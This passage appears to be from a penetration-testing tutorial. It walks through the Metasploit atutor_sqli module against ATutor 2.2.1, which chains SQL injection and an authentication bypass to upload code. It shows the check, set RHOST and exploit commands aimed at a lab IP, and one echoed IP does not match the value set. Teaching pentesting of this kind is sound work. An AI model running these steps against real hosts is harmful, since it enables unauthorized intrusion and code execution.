# How to do it...

This module exploits a SQL injection vulnerability and an authentication weakness vulnerability in ATutor 2.2.1, meaning that we can bypass authentication, reach the administrator's interface, and upload malicious code.

+   1. First, let us look at the exploit/multi/http/atutor_sqli exploit options:

![](bbox=[0.13, 0.28, 0.87, 0.6])

+   2. Before running the exploit, we can use the check command to verify if the target is vulnerable:

```
msf exploit(atutor_sqli) > check
[+] 192.168.216.136:80 The target is vulnerable.
msf exploit(atutor_sqli) >
```

+   3. To exploit the ATutor 2.2.1 SQL injection vulnerability, we need to set the target host IP address and run the module:

```
msf exploit(atutor_sqli) > set RHOST 192.168.216.136
RHOST => 192.168.216.135
msf exploit(atutor_sqli) > set TARGETURI /
TARGETURI => /
msf exploit(atutor_sqli) > exploit
```